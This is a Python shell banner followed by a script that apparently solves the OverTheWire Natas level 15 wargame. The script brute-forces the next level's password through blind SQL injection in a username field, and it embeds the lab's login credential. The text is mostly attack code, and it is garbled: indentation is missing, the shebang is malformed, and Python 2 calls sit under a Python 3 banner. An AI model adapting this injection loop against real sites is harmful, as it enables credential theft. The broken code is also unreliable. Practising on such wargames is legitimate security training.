Python 3.5.0 (v3.5.0:374f501f4567, Sep 12 2015, 11:00:19) 
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin
Type "copyright", "credits" or "license()" for more information.
>>> WARNING: The version of Tcl/Tk (8.5.9) in use may be unstable.
Visit http://www.python.org/download/mac/tcltk/ for current information.
!/usr/bin/python
import httplib2
import urllib
 
h = httplib2.Http()
h.add_credentials('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
baseStr = "";
char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
while index < len(char):
query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + baseStr + char[index] + "%\" ;# "))
resp, content = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
if ("This user exist" in str(content)):
baseStr += char[index];
print("New Password: " + baseStr)
index = 0
continue
index += 1
